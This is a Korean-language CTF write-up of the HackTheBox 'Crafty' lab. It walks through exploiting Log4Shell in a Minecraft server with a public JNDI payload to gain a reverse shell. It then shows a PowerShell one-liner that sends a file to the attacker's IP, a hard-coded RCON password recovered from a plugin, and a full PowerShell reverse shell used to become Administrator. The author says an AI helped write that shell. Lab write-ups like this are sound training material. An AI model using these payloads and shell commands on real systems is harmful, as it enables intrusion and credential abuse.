---
title: HTB-Crafty (Windows)
author: suh0rang
date: 2026-06-20 00:00:00 +0900
categories: [WriteUp, HackTheBox]
tags: [Windows, MineCraft, Log4Shell]
---

### Reconnaissance (정찰)

![](/assets/img/blog/lab/crafty/images.png)

기본 스캔만 진행했는데 80 포트 외에 열린 포트가 없었다. 
1-65535까지 포트를 스캔한 결과, 마인크래프트 포트(25565/tcp)가 오픈되어있는 것을 확인할 수 있었다.

![](/assets/img/blog/lab/crafty/image (1).png)

![](/assets/img/blog/lab/crafty/image (2).png)

80 포트로 운영 중인 웹 서버 접근 시 마인크래프트스러운 웹 사이트를 확인할 수 있으며, 별다른 기능 및 동작이 없었다.

### **Initial Vulnerability Analysis (초기 취약점 분석)**

마인크래프트에서 발생했던 유명한 취약점인 Log4Shell이 존재할 것이라 생각되어 victim 서버에 열려있는 마인크래프트 서버 접속을 시도하고자 했다.

Log4Shell

→ 서버에서 로그를 남길 때 특정 문자열(${jndi:...})을 단순 텍스트로 저장하지 않고 실행해야 할 명령어로 판단하여 실행해 버리는 취약점

- Minecraft TLaucher Install
    
    ![](/assets/img/blog/lab/crafty/image (3).png)
    
    victim의 마인크래프트 서버에 접속하기 위하여 TLauncher 설치를 진행한다.
    
    ![](/assets/img/blog/lab/crafty/image (4).png)
    
    `sudo dpkg -i tlauncher-linux-installer.deb`
    
    
    
    ![](/assets/img/blog/lab/crafty/image (5).png)
    
    Release 1.16.5 버전으로 다운로드 한 뒤, 마인크래프트를 실행한다.
    
    ![](/assets/img/blog/lab/crafty/image (6).png)
    
    ![](/assets/img/blog/lab/crafty/image (7).png)
    
    실행하면 다음과 같은 화면을 나타나고, victim 서버를 접속하기 위하여 Multiplayer 메뉴로 이동한다.
    
    ![](/assets/img/blog/lab/crafty/image (8).png)
    
    [Multiplayer - Direct Connection] 메뉴로 이동한 뒤 victim 서버 주소를 입력하면 채널 입장이 가능하다.
    
     
    

TLauncher를 통해 잘 진행되는 듯 하였으나 플레이 중 페이로드 전송 시 무반응/에러발생으로 인해 계속 머리를 싸매고 고민하게 되었다… 그러다 콘솔로 해보라는 조언을 듣고 아래의 콘솔을 사용하여 진행한다.

### **Exploitation (공격수행)**

https://github.com/MCCTeam/Minecraft-Console-Client

`curl -fsSL https://mccteam.github.io/install.sh | sh`

해당 Github에 기술된대로 위 명령어를 통해 다운로드한다.

![](/assets/img/blog/lab/crafty/image (9).png)

설치가 완료되면 설치 디렉터리에 MinecraftClient.ini 파일이 존재하는데, victim 서버로 접속하기 위해 해당 파일을 수정한다.

`sudo vi MinecraftClient.ini`

![](/assets/img/blog/lab/crafty/image (10).png)

```
[Main.General]
Account = { Login = "", Password = "-" }
Server = { Host = "10.10.15.169" }
AccountType = "mojang"  
Method = "mcc"
```

![](/assets/img/blog/lab/crafty/image (11).png)

`./MinecraftClient` 

마인크래프트 실행 후 Login : 라인에 임의의 문자열 입력 후 로그인을 시도하면 성공적으로 victim의 마인크래프트 서버에 연결이 성공한다.

공격 시 필수 조건

- 공격자가 리버스 쉘을 위하여 포트를 오픈한 뒤 대기
- 공격자의 ldap 서버
- 피해자의 마인크래프트 서버에 접속한 상태

![](/assets/img/blog/lab/crafty/image (12).png)

가장 먼저 attacker 서버에서 4444 포트를 리스닝

![](/assets/img/blog/lab/crafty/image (13).png)

`git clone https://github.com/kozmer/log4j-shell-poc`

`pip install -r requirements.txt`

![](/assets/img/blog/lab/crafty/image (14).png)

![](/assets/img/blog/lab/crafty/image (15).png)

victim의 서버는 윈도우이므로 poc.py 파일 내 cmd 변수에 작성되어있는 /bin/sh 을 cmd.exe 로 수정한다.

poc.py 파일에는 리버스쉘을 맺기 위한 java 코드가 기술되어있다.

![](/assets/img/blog/lab/crafty/image (16).png)

`python3 poc.py --userip 10.10.15.169 --webport 8000 --lport 4444`

- jdk1.8.0_20 download
    
    ![](/assets/img/blog/lab/crafty/image (17).png)
    
    위의 poc 실행 시 FileNotFoundError 가 발생한다면 jdk1.8.0_20 다운로드 후 해당 경로로 이동시켜야 한다.
    
    https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html
    
    ![](/assets/img/blog/lab/crafty/image (18).png)
    
    ![](/assets/img/blog/lab/crafty/image (19).png)
    
    압축 해제 
    
    tar -xvf jre-8u20-linux-x64.tar.gz
    
    ![](/assets/img/blog/lab/crafty/image (20).png)
    
    export JAVA_HOME=$HOME/Downloads/jdk1.8.0_20
    export PATH=$JAVA_HOME/bin:$PATH
    
    ![](/assets/img/blog/lab/crafty/image (21).png)
    
    ![](/assets/img/blog/lab/crafty/image (22).png)
    

### **Establishing Initial Access (최초 침투 성공)**

![](/assets/img/blog/lab/crafty/image (23).png)

바로 위에서 poc.py 파일 실행 시 생성된 ‘${jndi:ldap://attackerIP:1389/a}’ payload를 마인크래프트 콘솔에 전송한다.

![](/assets/img/blog/lab/crafty/image (24).png)

poc.py 가 실행중인 명령창을 확인해보니 victim IP에서 Exploit.class 파일에 접근하였음을 알 수 있다.

![](/assets/img/blog/lab/crafty/image (25).png)

attacker 측에서 리스닝 중인 4444 포트를 통해 victim 서버가 접속하여 리버스쉘이 맺어졌다. 

![](/assets/img/blog/lab/crafty/image (26).png)

접속한 사용자의 바탕화면에 user flag가 존재한다.

### **Privilege Escalation (권한 상승)**

![](/assets/img/blog/lab/crafty/image (27).png)

윈도우 권한상승에 대한 지식이 많이 부족해서 서버내 파일을 이것저것 확인해봤지만 이렇다 할 방법을 추측하기 어려웠다… 마인크래프트 권한 상승 관련 키워드를 검색하였을 때 특정 마인크래프트 모드와 서버 플러그인이 권한상승에 악용될 수 있다는 사실을 알게 되었다. 

![](/assets/img/blog/lab/crafty/image (28).png)

운영중인 server 디렉터리 하위의 plugins 디렉터리 접근 시 player counter-1.0-SNAPSHOT.jar 파일이 존재하였다. 

![](/assets/img/blog/lab/crafty/image (29).png)

nc -lvnp 4445 > playercounter-1.0-SNAPSHOT.jar

해당 파일을 내 로컬로 이동시키기 위해 nc를 이용해 임의의 포트(4445)를 리스닝 상태로 대기시킨다.

![](/assets/img/blog/lab/crafty/image (30).png)

```powershell
$b = [System.IO.File]::ReadAllBytes("c:\Users\svc_minecraft\server\plugins\playercounter-1.0-SNAPSHOT.jar"); $t = New-Object System.Net.Sockets.TcpClient('10.10.15.169', 4445); $s = $t.GetStream(); $s.Write($b, 0, $b.Length); $s.Close(); $t.Close()
```

powershell 사용이 가능해서 리버스 쉘이 맺어진 victim 서버에서 해당 파일을 attacker 서버로 전송하는 명령을 전달한다.

![](/assets/img/blog/lab/crafty/image (31).png)

![](/assets/img/blog/lab/crafty/image (32).png)

정상적으로 나의 로컬로 전송되었고 파일 압축 해제해보니 gui 화면으로 봐야겠다는 생각이 들었다…

- jd-gui 설치
    
    ![](/assets/img/blog/lab/crafty/image (33).png)
    
    wget https://github.com/java-decompiler/jd-gui/releases/download/v1.6.6/jd-gui-1.6.6.jar
    
    ![](/assets/img/blog/lab/crafty/image (34).png)
    
    java -jar jd-gui-1.6.6.jar
    

![](/assets/img/blog/lab/crafty/image (35).png)

jar 파일 내 Playercounter.class 파일에서 플러그인 소스코드 중 Rcon 패스워드가 평문으로 하드코딩된 것을 발견하였다.

```java
try {
rcon = new Rcon("127.0.0.1", 27015, "s67u84zKq8IXw".getBytes());
} catch (IOException e) {
throw new RuntimeException(e);
} catch (AuthenticationException e2) {
throw new RuntimeException(e2);
}
```

내부 Rcon 서비스가 C:\inetpub\wwwroot\playercount.txt라는 웹 루트 경로에 직접 작업을 수행하는 것을 확인했다. 

Rcon(Remote Console)은 마인크래프트 게임 서버 관리자가 게임 외부에서 원격으로 명령어를 실행하고 서버를 관리할 수 있게 해주는 프로토콜이다.

→ 일반 사용자 권한으로는 해당 경로에 파일 쓰기가 불가능하므로, 이 플러그인을 구동하는 프로세스가 Administrator 권한으로 실행 중이지 않을까 생각했다.

![](/assets/img/blog/lab/crafty/image (36).png)

위의 가정을 바탕으로 powershell에서 Administrator 계정으로 로그인 한 뒤, powershell을 해당 계정으로 실행시켜 리버스 쉘을 맺을 수 있는 코드를 AI에게 부탁했다. 

```powershell
$secpasswd = ConvertTo-SecureString "s67u84zKq8IXw" -AsPlainText -Force
$mycreds = New-Object System.Management.Automation.PSCredential ("Administrator", $secpasswd)
Start-Process powershell -Credential $mycreds -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command $c = New-Object System.Net.Sockets.TCPClient('10.10.15.169',5555);$s = $c.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (Invoke-Expression $d 2>&1 | Out-String );$e  = $sb + 'PS ' + (pwd).Path + '> ';$t =  ([text.encoding]::ASCII).GetBytes($e);$s.Write($t,0,$t.Length);$s.Flush()};$c.Close()”
```

![](/assets/img/blog/lab/crafty/image (37).png)

이미 리버스 쉘이 맺어진 4444 포트가 아닌 다른 임의의 포트 5555를 지정하여 리스닝 상태로 두고 있었는데, 해당 포트로 연결이 맺어진 것을 확인할 수 있었다.

![](/assets/img/blog/lab/crafty/image (38).png)

![](/assets/img/blog/lab/crafty/image (39).png)

리버스 쉘에 접속한 사용자가 Administratior인 것을 확인한 뒤, 바탕화면으로 이동해보니 root flag 파일을 획득할 수 있었다.